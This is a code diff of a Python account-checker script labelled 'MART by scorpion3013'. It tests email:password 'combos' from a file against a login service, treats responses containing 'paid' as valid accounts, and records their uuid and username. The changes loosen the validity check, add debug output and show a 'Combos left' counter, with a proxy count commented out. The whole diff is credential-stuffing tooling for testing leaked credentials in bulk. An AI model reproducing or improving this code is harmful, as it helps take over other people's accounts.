@@ -44,7 +44,7 @@ def check(x):
     email_username = account_file_lines[x].split(':', 1)[0]
     password = account_file_lines[x].split(':', 1)[1]
     answer = account_login(email_username=email_username, password=password)
-    if not str(answer).__contains__('Invalid credentials') and str(answer.__contains__("availableProfiles")):
+    if (str(answer).__contains__("paid")):
         try:
             uuid = answer["availableProfiles"][0]["id"]
             username = answer["availableProfiles"][0]["name"]
@@ -142,15 +142,17 @@ def check(x):
 
             cprint("Valid account " + username, "green")
         except Exception as e:
+            print(e)
+            print(json.dumps(answer, sort_keys=False, indent=4))
             cprint(email_username + " ", "red")
             Counter.invalid += 1
     else:
-        cprint('Invalid account', "red")
+        #cprint('Invalid account', "red")
         Counter.invalid += 1
     if windows:
         ctypes.windll.kernel32.SetConsoleTitleW(
             "MART by scorpion3013 | " +
-            "Combos: " + str(len(account_file_lines)) +
+            "Combos left: " + str(len(account_file_lines) - (Counter.valid + Counter.invalid)) +
             " | Working: " + str(Counter.valid) +
             " | Bad: " + str(Counter.invalid)) #+ " | Proxies alive: " + str(len(checker.proxy.working)))
 
